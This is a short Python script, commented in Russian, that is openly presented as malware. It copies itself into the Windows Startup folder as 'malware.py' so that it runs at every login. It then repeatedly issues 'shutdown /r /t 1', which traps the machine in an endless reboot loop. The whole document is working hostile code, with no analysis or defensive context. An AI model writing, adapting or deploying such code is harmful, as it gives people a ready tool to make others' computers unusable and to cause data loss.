import os
import shutil

# Копируем себя в автозагрузку
evil_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'malware.py')
shutil.copyfile(__file__, evil_path)

# Создаем бесконечный цикл, пожирающий ресурсы
while True:
    os.system("shutdown /r /t 1")  # Бесконечная перезагрузка